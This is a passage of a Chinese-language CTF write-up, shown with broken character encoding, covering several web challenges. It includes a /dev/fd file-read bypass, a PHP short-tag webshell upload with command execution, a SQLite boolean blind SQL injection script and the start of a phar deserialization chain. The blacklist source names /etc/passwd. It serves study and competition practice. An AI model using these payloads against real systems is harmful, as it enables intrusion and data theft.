</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>**Deprecated**: strlen(): Passing null to parameter #1 ($string) of type string is deprecated inÂ **/var/www/html/aa__^^.php**Â on lineÂ **3**  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>**Warning**: Undefined array key &#34;filename&#34; inÂ **/var/www/html/aa__^^.php**Â on lineÂ **4**  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>**Deprecated**: readfile(): Passing null to parameter #1 ($filename) of type string is deprecated inÂ **/var/www/html/aa__^^.php**Â on lineÂ **4**  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>**Fatal error**: Uncaught ValueError: Path cannot be empty in /var/www/html/aa__^^.php:4 Stack trace: #0 /var/www/html/aa__^^.php(4): readfile(&#39;&#39;) #1 {main} thrown inÂ **/var/www/html/aa__^^.php**Â on lineÂ **4**
</span></span></code></pre></div><p><strong>æ˜æ˜¾çœ‹å‡ºæ²¡æœ‰å®šä¹‰<code>filename</code>å‚æ•°ï¼Œç”¨ GET å’Œ POST æ–¹æ³•éƒ½è¯•ä¸€ä¸‹ï¼Œå¾—åˆ° filename æ˜¯é€šè¿‡ GET ä¼ é€’çš„å‚æ•°ï¼ŒçŒœæµ‹ filename å¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶åï¼Œæ‰€ä»¥ç”¨<code>?filename=/etc/passwd</code>æµ‹è¯•ï¼Œæ˜¾ç¤º Filename too longï¼Œé‚£å°±æŸ¥çœ‹ aa__^^.php æ–‡ä»¶æœ¬èº«</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;/my_secret.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">11</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">readfile</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Filename too long&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>é™åˆ¶æŸ¥è¯¢æ–‡ä»¶å­—ç¬¦æ•°é‡è¦å°äº 11</li>
</ul>
<p><strong>éœ€è¦çŸ¥é“ Linux/Unix æ“ä½œç³»ç»Ÿä¸­çš„æ–‡ä»¶æè¿°ç¬¦ç›¸å…³çŸ¥è¯†ï¼Œè¿™é‡Œéœ€è¦ç”¨ /dev/fd ç›®å½•ï¼Œè¿™ä¸ªç›®å½•åŒ…å«æŒ‡å‘å½“å‰è¿›ç¨‹å·²æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„ç¬¦å·é“¾æ¥ï¼Œè®¿é—®<code>/dev/fd/n</code>å®é™…ä¸Šå°±æ˜¯è®¿é—®å½“å‰è¿›ç¨‹ä¸­ä¸æ–‡ä»¶æè¿°ç¬¦ <code>n</code> å…³è”çš„é‚£ä¸ªåº•å±‚æ–‡ä»¶æˆ–æµï¼Œç»è¿‡æµ‹è¯• /dev/fd/12 æ˜¯ aa__^^.php æ–‡ä»¶ï¼Œ/dev/fd/13 æ˜¯ my_secret.txt æ–‡ä»¶ï¼Œæœ€ç»ˆ Payload å¦‚ä¸‹</strong></p>
<pre tabindex="0"><code class="language-Payload" data-lang="Payload">?filename=/dev/fd/13
</code></pre><h1 id="one_last_image">one_last_image<a hidden class="anchor" aria-hidden="true" href="#one_last_image">#</a></h1>
<p>#æ–‡ä»¶ä¸Šä¼  #WAF</p>
<p>é¢˜ç›®æè¿°ï¼šç¬¬ä¸€æ¬¡æ¥å—æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„æ„Ÿè§‰ï¼Œå› ä¸ºç‹¬å±äºæˆ‘çš„wafï¼Œæˆ‘æ—©å·²éƒ¨ç½²ã€‚å†è§äº†ï¼Œæ‰€æœ‰çš„ä¸€å¥è¯æœ¨é©¬ï¼ŒCan you give me one last shell?</p>
<p>ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªå›¾ç‰‡æ¸²æŸ“å°å·¥å…·ï¼Œå‘é€æ­£å¸¸çš„å›¾ç‰‡ï¼Œå¹¶ç”¨ BurpSuite æ‹¦æˆªå‘é€åˆ°é‡æ”¾å™¨ä¸­è¿›è¡Œæµ‹è¯•ï¼Œè§‚å¯Ÿ Response å¾—åˆ°</p>
<pre tabindex="0"><code class="language-Response" data-lang="Response">{&#34;input_url&#34;:&#34;uploads\/217b6235-e6d7-40bb-a4bf-0598af8c03cf.png&#34;,&#34;output_url&#34;:&#34;outputs\/217b6235-e6d7-40bb-a4bf-0598af8c03cf.png&#34;}
</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦ä¸Šä¼ çš„å›¾ç‰‡ä¼šå…ˆä¸Šä¼ åˆ° /uploads ç›®å½•ï¼Œç„¶åç»è¿‡é‡æ–°æ¸²æŸ“å°†æ–°å›¾ç‰‡ç”Ÿæˆåˆ° /outputs ç›®å½•ï¼Œè®¿é—® /uploads ç›®å½•ï¼Œå‘ç°æ˜¯ Apache web æœåŠ¡å™¨ï¼Œåç»­å¯èƒ½è¦åˆ©ç”¨ .htaccess æ–‡ä»¶</p>
<p>ç»è¿‡æ–‡ä»¶å†…å®¹ä¸Šä¼ æµ‹è¯•ï¼ŒPHP æ–‡ä»¶åç¼€æ²¡æœ‰è¿‡æ»¤ï¼Œæ–‡ä»¶å†…å®¹ä¸­è¿‡æ»¤äº†<code>php</code>å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œ<strong>ç›´æ¥ç”¨ PHP çŸ­æ ‡ç­¾ç›´æ¥ç»•è¿‡å³å¯</strong></p>
<pre tabindex="0"><code class="language-Payload" data-lang="Payload"># ä¸Šä¼ æ–‡ä»¶å†…å®¹ 
&lt;? eval($_GET[&#39;cmd&#39;]); ?&gt;
# è¿œç¨‹ä»£ç æ‰§è¡Œ
...uploads/xxx.php?cmd=system(&#39;env | grep SYC&#39;);
...uploads/xxx.php?cmd=phpinfo();
</code></pre><p><strong>è¿™é¢˜ flag è—åœ¨ç¯å¢ƒå˜é‡ä¸­ä¸å¤ªå¸¸è§„</strong></p>
<h1 id="sequal-no-uta">Sequal No Uta<a hidden class="anchor" aria-hidden="true" href="#sequal-no-uta">#</a></h1>
<p>#SQLite #SQLI #å¸ƒå°”ç›²æ³¨</p>
<p>é¢˜ç›®æè¿°ï¼šSQLite Ma U</p>
<p>ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæ ¹æ®é¢˜ç›®æè¿°åº”è¯¥æ˜¯ä¸€é“ SQLI é¢˜ç›®è€Œä¸”æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸º SQLiteï¼Œæ‰‹å·¥æ³¨å…¥æµ‹è¯•æ³¨å…¥ç‚¹å¾—åˆ°<code>/check.php?name=0'/**/or/**/1=1/**/--+</code>ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼ŒæŸ¥è¯¢æˆåŠŸäº†æ˜¾ç¤º<code>è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ</code>ï¼ŒæŸ¥è¯¢å¤±è´¥æ˜¾ç¤º<code>æœªæ‰¾åˆ°ç”¨æˆ·æˆ–å·²åœç”¨</code>ï¼Œ<strong>æ˜¯ä¸€ä¸ªå…¸å‹çš„å¸ƒå°”ç›²æ³¨</strong></p>
<p><strong>å› ä¸ºè¿™é¢˜ç”¨çš„æ˜¯ SQLite ä¸æ˜¯å¸¸è§„çš„ MySql ç­‰ï¼Œè¯­æ³•ä¹‹é—´æœ‰äº›è®¸å·®å¼‚ï¼Œè¿™é‡Œå°±åˆ—å‡ºä¸€äº›è¿™é¢˜è¦ç”¨çš„å·®åˆ«</strong></p>
<ul>
<li><code>ascii()</code>å‡½æ•°ç”¨<code>unicode()</code>å‡½æ•°æ›¿ä»£å³å¯ï¼Œè¯­æ³•ç›¸åŒ</li>
<li>SQLite ä¸­çš„çš„ç³»ç»Ÿè¡¨ä¸º<code>sqlite_master</code>ç±»ä¼¼äº MySql ä¸­çš„<code>information_schema</code></li>
<li>æŸ¥è¯¢è¡¨åç”¨<code>select tbl_name from sqlite_master where type='table'</code></li>
<li>æŸ¥è¯¢è¡¨ä¸­çš„åˆ—ä¿¡æ¯ç”¨<code>select group_concat(name) from pragma_table_info('&lt;table_name&gt;')</code></li>
<li>limit çš„ç”¨æ³•ä¸º<code>limit &lt;è¦è¿”å›çš„è¡Œæ•°&gt; offset &lt;è¦è·³è¿‡çš„è¡Œæ•°&gt;</code></li>
<li>&hellip;&hellip;</li>
</ul>
<p><strong>æŸ¥è¡¨åè¯­å¥</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(tbl_name,{i},1)) from sqlite_master where type=&#39;</span><span style="color:#66d9ef">table</span><span style="color:#e6db74">&#39; limit 1)={j} --+
</span></span></span></code></pre></div><p><strong>æŸ¥åˆ—åè¯­å¥</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(group_concat(name),{i},1)) from pragma_table_info(&#39;</span>users<span style="color:#e6db74">&#39;))={j} --+
</span></span></span></code></pre></div><p><strong>æŸ¥ flag è¯­å¥</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; or (select unicode(substr(secret,{i},1)) from users limit 1)={j} --+
</span></span></span></code></pre></div><p><strong>å…·ä½“è„šæœ¬</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#75715e"># è®¾ç½® url</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://xxx.geek.ctfplus.cn/check.php&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># è®¾ç½®æ³¨å…¥æˆåŠŸçš„æ ‡å¿—</span>
</span></span><span style="display:flex;"><span>success_indicator <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;è¯¥ç”¨æˆ·å­˜åœ¨ä¸”æ´»è·ƒ&#39;</span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bool_blind_sqli</span>():
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;å¼€å§‹ç›²æ³¨æŸ¥è¯¢ï¼š&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># è®¾ç½®æŸ¥è¯¢æœ€é•¿é•¿åº¦</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># è®¾ç½®å­—ç¬¦çš„ ASCII å€¼èŒƒå›´ï¼ˆå¯æ‰“å°å­—ç¬¦ï¼‰</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">128</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = f&#34;0&#39;/**/or/**/(select/**/unicode(substr(tbl_name,{i},1))/**/from/**/sqlite_master/**/where/**/type=&#39;table&#39;/**/limit/**/1)={j}/**/--+&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># payload = f&#34;0&#39;/**/or/**/(select/**/unicode(substr(group_concat(name),{i},1))/**/from/**/pragma_table_info(&#39;users&#39;))={j}/**/--+&#34;</span>
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0&#39;/**/or/**/(select/**/unicode(substr(secret,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1))/**/from/**/users/**/limit/**/1)=</span><span style="color:#e6db74">{</span>j<span style="color:#e6db74">}</span><span style="color:#e6db74">/**/--+&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># å‘é€ GET è¯·æ±‚</span>
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">?name=</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> success_indicator <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">+=</span> chr(j)
</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;æ‰¾åˆ°ç¬¬ </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> ä¸ªå­—ç¬¦ï¼š</span><span style="color:#e6db74">{</span>chr(j)<span style="color:#e6db74">}</span><span style="color:#e6db74">ï¼Œå½“å‰ç»“æœï¼š</span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># å¦‚æœå†…å±‚å¾ªç¯æ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ï¼Œè¯´æ˜å­—ç¬¦ä¸²å·²ç»“æŸ</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found_char:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;ç›²æ³¨ç»“æŸ&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str <span style="color:#f92672">=</span> bool_blind_sqli()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;è·å¾—çš„ç»“æœï¼š</span><span style="color:#e6db74">{</span>str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h1 id="ez-seralize">ez-seralize<a hidden class="anchor" aria-hidden="true" href="#ez-seralize">#</a></h1>
<p>#ä»£ç å®¡è®¡ #ç›®å½•æ‰«æ #Phar</p>
<p>é¢˜ç›®æè¿°ï¼šç®€å•çš„è¯»æ–‡ä»¶?</p>
<p>ç½‘ç«™é¦–é¡µæœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–çš„åŠŸèƒ½ï¼Œé‚£ç›´æ¥<strong>è¯»å– index.php å¾—åˆ°</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($filename) <span style="color:#f92672">&amp;&amp;</span> $filename <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;&#39;</span>) {
</span></span><span style="display:flex;"><span>    $balcklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;%2e&#34;</span>,<span style="color:#e6db74">&#34;..&#34;</span>,<span style="color:#e6db74">&#34;data://&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>,<span style="color:#e6db74">&#34;%0a&#34;</span>,<span style="color:#e6db74">&#34;%&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;%0d&#34;</span>,<span style="color:#e6db74">&#34;php://&#34;</span>,<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>,<span style="color:#e6db74">&#34;/proc/self/environ&#34;</span>,<span style="color:#e6db74">&#34;php:file&#34;</span>,<span style="color:#e6db74">&#34;filter&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($balcklist <span style="color:#66d9ef">as</span> $v) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($filename, $v) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>            $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;no no no&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($error <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;serialized&#39;</span>])) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;function.php&#39;</span>;
</span></span><span style="display:flex;"><span>            $file_contents<span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read seraizlie file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $file_contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>è¯»å–æ–‡ä»¶åç»è¿‡é»‘åå•è¿‡æ»¤ï¼Œ<code>phar://</code>ä¸åœ¨é»‘åå•ä¸­</li>
<li>è¦ GET æ–¹æ³•ä¼ å…¥<code>serialized</code>å‚æ•°ï¼Œæ‰å¯ä»¥æ‰§è¡Œå…³é”®ä»£ç </li>
<li>å‘ç° function.php æ–‡ä»¶</li>
</ul>
<p><strong>è¯»å– function.php æ–‡ä»¶</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {
</span></span><span style="display:flex;"><span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rce_me</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($b <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> $b;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rce_me</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Success!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag/flag.txt &gt; /tmp/flag&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>å®šä¹‰äº†ä¸‰ä¸ªç±»ï¼Œç†Ÿæ‚‰çš„ PHP ååºåˆ—åŒ–çš„å‘³é“</li>
</ul>
<p><strong>åšåˆ°è¿™é‡Œæ€è·¯å·²ç»éå¸¸æ¸…æ¥šäº†ï¼Œå°±æ˜¯è¦æ‰§è¡Œ PHP ååºåˆ—åŒ–ï¼Œè¦ç”¨ä¸Šä¼ çš„ Phar æ–‡ä»¶è§£ææ‰§è¡Œååºåˆ—åŒ–ï¼Œé€šè¿‡ dirsearch ç›®å½•æ‰«æå¾—åˆ°ä¸Šä¼ æ–‡ä»¶å…¥å£ uploads.phpï¼ŒæŸ¥çœ‹ uploads.php æ–‡ä»¶</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#75715e">// uploads.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$uploadDir <span style="color:#f92672">=</span> <span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/uploads/&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($uploadDir)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mkdir</span>($uploadDir, <span style="color:#ae81ff">0755</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;txt&#39;</span>, <span style="color:#e6db74">&#39;log&#39;</span>, <span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;zip&#39;</span>,<span style="color:#e6db74">&#39;gif&#39;</span>,<span style="color:#e6db74">&#39;gz&#39;</span>];
</span></span><span style="display:flex;"><span>$allowedMimes <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;txt&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;log&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpg&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpeg&#39;</span> <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
